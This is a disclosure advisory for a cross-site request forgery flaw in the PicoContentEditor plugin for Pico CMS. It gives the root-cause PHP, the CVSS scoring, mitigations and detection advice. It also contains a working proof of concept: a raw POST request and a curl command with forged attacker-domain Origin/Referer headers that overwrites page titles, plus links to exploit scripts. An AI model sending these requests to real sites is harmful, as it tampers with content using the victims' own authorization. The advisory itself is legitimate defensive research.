# Security Advisory: Cross-Site Request Forgery (CSRF) in PicoContentEditor Save/Upload Endpoints

> **Identifier:** Pending CVE assignment
> **Publication Date:** 11/10/2026
> **Last Updated:** 11/10/2026
> **Severity:** Medium
> **CVSS:** 5.4 · `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`
> **CWE:** CWE-352: Cross-Site Request Forgery (CSRF)
> **Status:** Unpatched

---

## 1. Executive Summary

PicoContentEditor's content-saving and file-upload endpoints (`Edits::saveMeta()`, `Edits::saveRegions()`, `Uploads::saveFile()`) perform no CSRF token validation, and the server performs no validation of the `Origin` or `Referer` headers either. A cross-site `POST` request — e.g. from an auto-submitting HTML form hosted on an attacker-controlled page — is processed identically to a legitimate same-site request. This means that **even in deployments that correctly install the plugin's official mitigation (`PicoUsers`)**, an attacker can still tamper with page content by tricking an authenticated editor/admin into visiting a malicious page while logged in. This is distinct from, and persists independently of, the previously reported unauthenticated-upload vulnerability (CVSS 9.8) in the same plugin, which only applies when `PicoUsers` is absent.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| nliautaud/pico-content-editor (PicoContentEditor plugin for Pico CMS) | All versions evaluated | None | Affected |
| Component: `src/Edits.php`, `src/Uploads.php` | All versions | None | Affected |

- **Repository / Ecosystem:** https://github.com/nliautaud/pico-content-editor
- **Evaluated stack:** Pico CMS 3.0.0-alpha, PHP 8.1.34, Apache 2.4.65 (Debian)

### Unaffected Products

- None evaluated. The flaw is in the plugin's request-handling logic itself, independent of whether `PicoUsers` is installed — `PicoUsers` only decides *who* is allowed to trigger the save/upload action, it does not add any CSRF protection to the action itself.

---

## 3. Vulnerability Description

`PicoContentEditor::onContentLoaded()` and `onPageRendered()` process `$_POST[Edits::KEY]` (`PicoContentEditor[meta]`/`[regions]`) and `$_FILES['PicoContentEditorUpload']` whenever present, gated only by `Auth::can(Auth::SAVE)`/`Auth::can(Auth::UPLOAD)`. Neither `Edits.php` nor `Uploads.php` nor `PicoContentEditor.php` contains any reference to a CSRF token, nonce, `Origin`, `Referer`, or `SameSite` cookie configuration — confirmed by a full-text search across the plugin's PHP source (`grep -rni "csrf|samesite|origin|referer"` returns zero matches outside of bundled third-party JS assets unrelated to this request flow).

**Root cause:**

```php
// src/Edits.php
public function saveMeta($rawContent, $rawMeta, $fileLocation)
{
    if (!$this->meta) {
        return;
    }
    $rawContent = str_replace($rawMeta, $this->meta, $rawContent, $count);
    // ... no CSRF token checked anywhere before this point
    if (!file_put_contents($fileLocation, $rawContent)) {
        ...
    }
}
```

```php
// PicoContentEditor.php
public function processPageEdits($rawContent)
{
    if (!$this->edits->beenReceived()) {
        return;
    }
    if (Auth::can(Auth::SAVE)) {           // authorization check only -- no CSRF check
        $this->edits->saveMeta($rawContent, $this->getRawMeta(), $this->getRequestFile());
        ...
    }
}
```

Because the only gate is `Auth::can(Auth::SAVE)` (an *authorization* check, answering "is this user allowed to save?"), and never anything that verifies the request's *origin* or possession of a per-session token, any request that carries the victim's valid session cookie — regardless of which site it originated from — is processed exactly as if the legitimate user had submitted the form themselves.

### Necessary Conditions

- **Authentication:** The victim must have an active, authorized session (`Auth::can(Auth::SAVE)` or `Auth::can(Auth::UPLOAD)` returning `true` for them) — this includes the default insecure configuration (no `PicoUsers`, where every visitor is implicitly authorized) as well as a correctly configured `PicoUsers` setup where a legitimate editor/admin is logged in.
- **User interaction:** The victim must visit an attacker-controlled page while their authenticated session is active.
- **Attack vector:** Network
- **Preconditions:** PicoContentEditor installed and enabled; no explicit `SameSite=Strict` cookie configuration overriding PHP's default (the default session cookie in the evaluated environment carries no `SameSite` attribute at all, `session.cookie_samesite` being empty, meaning protection against this flaw currently depends entirely on the visiting browser's own default behavior rather than any control enforced by the application)

---

## 4. Impact

An attacker who lures an authenticated PicoContentEditor user (editor or admin) to a malicious web page can silently tamper with site content — overwriting page titles, descriptions, and other YAML front-matter fields, or planting files via the upload endpoint — without the victim's knowledge or any visible interaction beyond loading the page.

- **Confidentiality:** None
- **Integrity:** High — arbitrary overwrite of page metadata/content, and (when combined with the upload endpoint) arbitrary file planting under the attacker's control, using the victim's authorization
- **Availability:** None directly, though content defacement may disrupt the site's intended function

---

## 5. Classification

### CVSS

- **Score:** 5.4
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | N |
| Attack Complexity (AC) | L |
| Privileges Required (PR) | N |
| User Interaction (UI) | R |
| Scope (S) | U |
| Confidentiality (C) | N |
| Integrity (I) | H |
| Availability (A) | N |

*Note: practical exploitability in current mainstream browsers (Chrome, Firefox, Edge) is partially reduced by their default treatment of cookies lacking an explicit `SameSite` attribute as `Lax`, which blocks the session cookie from being sent on simple cross-site `POST` requests. This is a browser-level mitigation, not an application-level one — PicoContentEditor sets no `SameSite` attribute itself, performs no server-side Origin/Referer validation, and relies entirely on the visiting client's own defaults. Older browsers, non-standard HTTP clients, embedded webviews, or any deployment that sets `SameSite=None` for legitimate cross-origin needs remain fully exploitable.*

### CWE

- CWE-352: Cross-Site Request Forgery (CSRF)

### CAPEC (optional)

- CAPEC-62: Cross Site Request Forgery

---

## 6. Exploitation Scenario

1. Attacker crafts an HTML page containing an auto-submitting `<form method="POST">` targeting the victim Pico CMS site's root URL, with a hidden field `PicoContentEditor` containing a JSON payload (e.g. `{"meta":"Title: PWNED\n"}`)
2. Attacker lures a logged-in editor/admin (or, in an unprotected default install, any visitor) to this page via a link, email, or embedded content
3. The victim's browser automatically submits the form to the target site, including the victim's session cookie (subject to the browser's own `SameSite` handling)
4. `PicoContentEditor::Edits::saveMeta()` processes the request, finds `Auth::can(Auth::SAVE)` true for the victim's session, and overwrites the page's front matter with attacker-controlled content — with no token or Origin check ever performed

---

## 7. Technical Evidence

### Affected Component

```text
File(s): src/Edits.php (saveMeta(), saveRegions()), src/Uploads.php (saveFile()), PicoContentEditor.php (processPageEdits(), processOverallEdits())
Parameter(s): POST field "PicoContentEditor" (JSON), multipart field "PicoContentEditorUpload"
Method: POST · Authentication: session-based (any level granted by Auth::can())
```

### Example Request

```http
POST / HTTP/1.1
Host: 127.0.0.1:9088
Origin: http://evil-attacker.com
Referer: http://evil-attacker.com/csrf.html
Content-Type: application/x-www-form-urlencoded

PicoContentEditor=%7B%22meta%22%3A%22Title%3A+PWNED-BY-CSRF%5CnDescription%3A+pagina+adulterada+via+CSRF%5Cn%22%7D
```

### Observed Response

```json
{"status":[{"state":true,"message":"Page meta saved<br>Reload the page to see changes."}],
 "edited":{"meta":"Title: PWNED-BY-CSRF-1791684756\nDescription: pagina adulterada via CSRF, sem token, sem checagem de Origin\n","regions":[]},
 "file":null,"debug":false}
```

### Result

Reproduced in an authorized local lab (Docker container `picocms-pico3-1`). A request was sent with `Origin`/`Referer` headers explicitly set to an unrelated attacker domain — exactly as a real browser would send them from a cross-site auto-submitting form — and the server accepted and applied the change without any complaint. Re-fetching the homepage confirmed the `<title>` tag had changed to the attacker-supplied value. The original content was restored immediately after validation, and the test plugin installation was removed from the container.

**Evidence:**
<img width="1100" height="900" alt="01_csrf_execution" src="https://github.com/user-attachments/assets/a3cb1fa9-7647-4b92-a494-b14e71334aa5" />

---

## 8. Proof of Concept

This PoC is intended for authorized lab environments only. It uses a non-destructive content change (overwriting a demo page's title/description) and the environment is restored immediately after validation.

```bash
curl -H "Origin: http://evil-attacker.com" -H "Referer: http://evil-attacker.com/csrf.html" \
     --data-urlencode 'PicoContentEditor={"meta":"Title: PWNED\nDescription: csrf poc\n"}' \
     http://127.0.0.1:9088/
```

An equivalent zero-JavaScript-logic browser-based PoC (single `onload` auto-submit, no file manipulation) is provided in [csrf_meta_overwrite.html](https://github.com/user-attachments/files/33399329/csrf_meta_overwrite.html). A fully automated script that exercises the same flow end-to-end is provided in [exploit.sh](https://github.com/user-attachments/files/33399376/exploit.sh), with setup handled by [setup_target.sh](https://github.com/user-attachments/files/33399417/setup_target.sh).


### Expected Result

```text
{"status":[{"state":true,"message":"Page meta saved..."}], ...}
```
followed by the target page's `<title>` reflecting the attacker-supplied value on subsequent requests.

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data — tested only against a local, authorized lab instance, with content restored immediately after.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Set up an authorized local instance of Pico CMS with PicoContentEditor installed and enabled (with or without `PicoUsers` — the flaw is present either way).
2. Send a `POST /` request with the `PicoContentEditor` form field described in Section 8, setting `Origin`/`Referer` headers to an unrelated domain.
3. Observe the JSON response confirming the save succeeded.
4. Re-fetch the target page and confirm its title/description reflect the attacker-supplied content.
5. Compare with the expected safe behavior: the request should be rejected (e.g. HTTP 403) when it lacks a valid CSRF token or carries a mismatched Origin/Referer.

---

## 10. Mitigation

Until an official fix is available:

- Explicitly set `session.cookie_samesite = Strict` (or at minimum `Lax`) in the PHP configuration serving the Pico CMS instance, ensuring the attribute is actually sent (do not rely on browser defaults).
- Deploy a reverse proxy/WAF rule that rejects `POST /` requests to the site root when `Origin`/`Referer` do not match the site's own domain.
- Limit which accounts are granted `PicoContentEditor/save` and `PicoContentEditor/upload` rights via `PicoUsers` to the minimum necessary.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of this date.**

Recommended actions:

1. Apply the `SameSite` cookie and reverse-proxy mitigations above until the plugin is patched.
2. Review recent content changes for unexplained modifications that may indicate prior exploitation.

### Recommended Change to Vendor

- Implement a per-session CSRF token, generated server-side and embedded in the editor's save/upload forms, validated with a constant-time comparison (`hash_equals()`) before processing any `Edits`/`Uploads` request.
- As defense-in-depth, validate the `Origin`/`Referer` header server-side against the configured `base_url`.
- Explicitly set `SameSite=Strict` (or `Lax`) on the session cookie rather than relying on PHP/browser defaults.

### Additional Hardening Note (not independently exploitable, documented for completeness)

During this research we also reviewed `EditableRegion::save()` (`src/EditableRegion.php:58-59`), which resolves a `data-src` HTML attribute (parsed via regex from page/theme content) directly into a filesystem path with no sanitization against `../` sequences:

```php
if ($this->source) {
    $file = $contentEditor->getRootDir() . $this->source;   // no path sanitization
} else {
    $file = $contentEditor->getRequestFile();
}
```

We traced the only two write primitives exposed by the plugin (`Edits::saveMeta()`, scoped strictly to the YAML front-matter block, and `Edits::saveRegions()`, which only replaces the *inner* content of an already-existing `data-editable` tag while preserving its opening tag — and therefore its `data-src` attribute — verbatim) and found that an external attacker has no way to inject or alter a `data-src` value through the plugin's own request handling. Exploiting this would require either a theme author having already hard-coded an unsafe `data-src` themselves, or an attacker who has already achieved arbitrary file write through another vector (e.g. the unauthenticated-upload RCE documented separately), at which point this provides no additional capability. We are not treating this as an independently exploitable vulnerability, but recommend the vendor still sanitize `$this->source` with the same path-normalization logic Pico's core already applies elsewhere (`Pico::getNormalizedPath()`), as a defense-in-depth measure against future changes that might expose a new way to influence this value.

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Unexplained changes to page titles, descriptions, or other front-matter fields with no corresponding legitimate editor action in server logs
- `POST /` requests to the site root with an `Origin`/`Referer` header that does not match the site's own domain

### Example Log Search

```text
grep "POST / HTTP" access.log
# cross-reference with any Referer/Origin values not matching the site's own domain
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 11/10/2026 | Vulnerability identified (static code analysis of PicoContentEditor) |
| 11/10/2026 | Confirmed in authorized local lab environment |
| 11/10/2026 | Disclosure package prepared |
| 11/10/2026 | Vendor notified |
| pending | CVE requested or reserved |
| pending | Fix made available |
| pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Nicolas Liautaud (nliautaud)
- **Channel used:** Private GitHub Security Advisory of repository / maintainer email
- **Date of first notification:** pending
- **Response status:** Awaiting response
- **Vendor position:** N/A

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security research
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-352: https://cwe.mitre.org/data/definitions/352.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1
- Plugin repository: https://github.com/nliautaud/pico-content-editor

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 11/10/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local lab environment (self-hosted Docker containers) and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/nliautaud/pico-content-editor
